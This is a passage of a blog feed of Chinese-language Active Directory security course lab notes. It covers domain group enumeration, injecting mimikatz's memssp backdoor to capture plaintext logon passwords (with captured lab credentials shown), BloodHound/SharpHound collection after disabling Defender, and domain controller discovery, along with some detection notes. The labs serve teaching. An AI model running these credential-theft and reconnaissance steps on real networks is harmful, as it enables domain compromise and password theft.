&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ net groups /domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>這項要求會在網域 kuma.org 下的網域控制站處理。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">\\&lt;/span>WIN-818G5VCOLJO.kuma.org 的群組帳戶
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*accounting
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Cloneable Domain Controllers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*DnsUpdateProxy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Domain Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Domain Computers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Domain Controllers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Domain Guests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Domain Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Enterprise Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Enterprise Key Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Enterprise Read-only Domain Controllers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Executives
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Group Policy Creator Owners
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*IT Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Key Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*marketing
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Office Admin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Project management
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Protected Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Read-only Domain Controllers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*sales
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Schema Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*Senior management
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ net groups &lt;span style="color:#e6db74">&amp;#34;Domain Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>這項要求會在網域 kuma.org 下的網域控制站處理。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>群組名稱 Domain Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>註解 Designated administrators of the domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>成員
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ net groups &lt;span style="color:#e6db74">&amp;#34;Schema Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>這項要求會在網域 kuma.org 下的網域控制站處理。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>群組名稱 Schema Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>註解 Designated administrators of the schema
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>成員
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ net groups &lt;span style="color:#e6db74">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>這項要求會在網域 kuma.org 下的網域控制站處理。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>群組名稱 Enterprise Admins
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>註解 Designated administrators of the enterprise
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>成員
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到目前這三個預設的群組，都只有Administrator在裡面而已
:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/</guid><description>&lt;h1 id="ntustisc---ad-note---lab無法reboot的時盜取passwd">
 NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來&lt;/p>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="無法reboot的時盜取passwd">
 ==無法Reboot的時盜取Passwd==
 &lt;a class="anchor" href="#%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Inject memssp
記得用系統管理員權限開mimikatz
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># privilege::debug&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Privilege &lt;span style="color:#e6db74">&amp;#39;20&amp;#39;&lt;/span> OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># misc::memssp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injected &lt;span style="color:#f92672">=)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Relogin
重新登出再登入才會看到&lt;/li>
&lt;li>Result
在&lt;code>C:\Windows\System32\mimilsa.log&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f7c0f&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f7c0f&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80d1&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80d1&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80e8&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80e8&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc85a&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc85a&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>可以看到這個log file用明文的方式新增了我們剛剛打入的密碼&lt;/li>
&lt;/ol>
&lt;h3 id="how-to-detect-it">
 ==How to detect it?==
 &lt;a class="anchor" href="#how-to-detect-it">#&lt;/a>
&lt;/h3>
&lt;p>一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(環境調查BloodHound)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/</guid><description>&lt;h1 id="ntustisc---ad-note---lab環境調查bloodhound">
 NTUSTISC - AD Note - Lab(環境調查BloodHound)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5bloodhound">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://medium.com/renee0918/how-to-protect-windows-global-event-c19bba0ce890">[Windows Programming] IPC 通知機制與安全設定&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>當系統中需要同步處理某些資源的存取權時，可以使用 Windows 的同步處理物件協調不同 process 間對於共同資源的互動，Windows 提供的同步處理物件有四種，分別是: Event, Mutex, Semaphore, Waitable timer，本篇只會提到 Event 喔！&lt;/p>
&lt;p>假設系統中有兩個 process：process A 得等待 process B 完成某些特定工作後才能繼續執行。windows 提供的 event 機制能讓 process B 完成工作後發出訊號通知 process A，而 process A 則進入等待狀態直到接受到訊號後才繼續執行後續工作。Process 間只需定好溝通的 event name 就可以輕鬆達成跨程序間的通訊 (Inter-process communication : IPC)，正因為簡單好實現的特性，event 常被用在程序間的溝通與同步。&lt;/p>&lt;/blockquote>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="bloodhound-ad">
 BloodHound AD
 &lt;a class="anchor" href="#bloodhound-ad">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>說明: 環境調查的視覺化工具&lt;/li>
&lt;li>版本: 4.0.3
:::info
&lt;font color="FF0000">8/29更新：經過實測還是建議使用4.1.0&lt;/font>，詳細原因可以參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>，原作者說明這是一個bug，已在4.1.0做了修正，所以還是以4.1.0為主，雖然聽講師說可能會少東西，不過對我們小專案來說應該沒差
:::&lt;/li>
&lt;li>Link: &lt;a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3">BloodHound GitHub&lt;/a>&lt;/li>
&lt;li>必要條件: 必須裝設Neo4j Server / Graph Database, 而且必須要是community version，&lt;a href="https://neo4j.com/download-center/#community">link&lt;/a>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>Download Collector
BloodHound是一個環境調查的視覺化工具，所以要先在我們的環境先蒐集一些環境上的資訊，再導入到BloodHound中進行分析，因此我們應該先下載能夠蒐集環境資訊的&lt;a href="https://github.com/BloodHoundAD/BloodHound">Collector&lt;/a>我是直接把整包clone下來，然後用隨身碟傳到VM(因為那時候Win10已經加入AD，我懶得改回來上網)
:::info
Note:
Windows的defender會擋&lt;code>BloodHound-master/Collectors/SharpHound.exe&lt;/code>和&lt;code>SharpHound.ps1&lt;/code>這兩個files，所以記得關掉defender
:::&lt;/li>
&lt;li>Use the Collector First
:::info
Note: 記得要用bear的網域帳號登入，SharpHound.exe才找的到LDAP
:::
CMD直接進入&lt;code>C:\tools\BloodHound-master\Collectors&lt;/code>，然後直接執行&lt;code>$ SharpHound.exe&lt;/code>
:::spoiler Implementation
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ SharpHound.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:31.4846421+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:31.6707467+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:31.6985917+08:00|INFORMATION|Initializing SharpHound at 上午 11:02 on 2023/8/29
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:31.9891653+08:00|INFORMATION|&lt;span style="color:#f92672">[&lt;/span>CommonLib LDAPUtils&lt;span style="color:#f92672">]&lt;/span>Found usable Domain Controller &lt;span style="color:#66d9ef">for&lt;/span> kuma.org : WIN-818G5VCOLJO.kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:32.3820391+08:00|INFORMATION|Loaded cache with stats: &lt;span style="color:#ae81ff">163&lt;/span> ID to type mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">163&lt;/span> name to SID mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span> machine sid mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span> sid to domain mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> global catalog mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:32.3915435+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:32.6206999+08:00|INFORMATION|Beginning LDAP search &lt;span style="color:#66d9ef">for&lt;/span> kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:32.8062803+08:00|INFORMATION|Producer has finished, closing LDAP channel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:02:32.8230625+08:00|INFORMATION|LDAP channel closed, waiting &lt;span style="color:#66d9ef">for&lt;/span> consumers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:03.3930708+08:00|INFORMATION|Status: &lt;span style="color:#ae81ff">0&lt;/span> objects finished &lt;span style="color:#f92672">(&lt;/span>+0 0&lt;span style="color:#f92672">)&lt;/span>/s -- Using &lt;span style="color:#ae81ff">42&lt;/span> MB RAM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.1743544+08:00|INFORMATION|Consumers finished, closing output channel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Closing writers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.2209345+08:00|INFORMATION|Output channel closed, waiting &lt;span style="color:#66d9ef">for&lt;/span> output task to complete
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.3058132+08:00|INFORMATION|Status: &lt;span style="color:#ae81ff">204&lt;/span> objects finished &lt;span style="color:#f92672">(&lt;/span>+204 5.1&lt;span style="color:#f92672">)&lt;/span>/s -- Using &lt;span style="color:#ae81ff">44&lt;/span> MB RAM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.3058132+08:00|INFORMATION|Enumeration finished in 00:00:40.6864986
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.3918361+08:00|INFORMATION|Saving cache with stats: &lt;span style="color:#ae81ff">163&lt;/span> ID to type mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">163&lt;/span> name to SID mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span> machine sid mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span> sid to domain mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> global catalog mappings.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-08-29T11:03:13.4075189+08:00|INFORMATION|SharpHound Enumeration Completed at 上午 11:03 on 2023/8/29! Happy Graphing!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::
理論上成功的話，會在該folder中出現一個.zip file with name &lt;code>&amp;lt;TimeStamp&amp;gt;.BloodHound.zip&lt;/code>此時按照之前啟動BloodHound的方法啟動BloodHound，然後把zip folder拖進去就可以了
&lt;img src="https://hackmd.io/_uploads/rk8rZJjT2.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h3 id="如何偵測ad">
 ==如何偵測AD==
 &lt;a class="anchor" href="#%e5%a6%82%e4%bd%95%e5%81%b5%e6%b8%acad">#&lt;/a>
&lt;/h3>
&lt;p>有兩種方法，也可以同時使用&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(當前網域控制站(DC))</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/</guid><description>&lt;h1 id="ntustisc---ad-note---lab當前網域控制站dc">
 NTUSTISC - AD Note - Lab(當前網域控制站(DC))
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e7%95%b6%e5%89%8d%e7%b6%b2%e5%9f%9f%e6%8e%a7%e5%88%b6%e7%ab%99dc">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="情報蒐集當前網域控制站dc">
 情報蒐集：==當前網域控制站(DC)==
 &lt;a class="anchor" href="#%e6%83%85%e5%a0%b1%e8%92%90%e9%9b%86%e7%95%b6%e5%89%8d%e7%b6%b2%e5%9f%9f%e6%8e%a7%e5%88%b6%e7%ab%99dc">#&lt;/a>
&lt;/h3>
&lt;p>以駭客的角度來說，如果已經連到AD中，要怎麼知道目前DC是誰
常用的cheat sheet&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ echo %logonserver%
$ nltest /dclist:&amp;lt;domain&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::spoiler Implementation&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo %logonserver%
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">\\&lt;/span>WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nltest /dclist:kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>取得網域 &lt;span style="color:#e6db74">&amp;#39;kuma.org&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>從 &lt;span style="color:#e6db74">&amp;#39;\\WIN-818G5VCOLJO.kuma.org&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> 中的 DC 清單。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WIN-818G5VCOLJO.kuma.org &lt;span style="color:#f92672">[&lt;/span>PDC&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>DS&lt;span style="color:#f92672">]&lt;/span> 站台: Default-First-Site-Name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令成功完成
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://hackmd.io/_uploads/S1pgfnvph.png" alt="" />
從Win10當中下指令的確可以知道Win2016的PC Name是&lt;code>WIN-818G5VCOLJO&lt;/code>
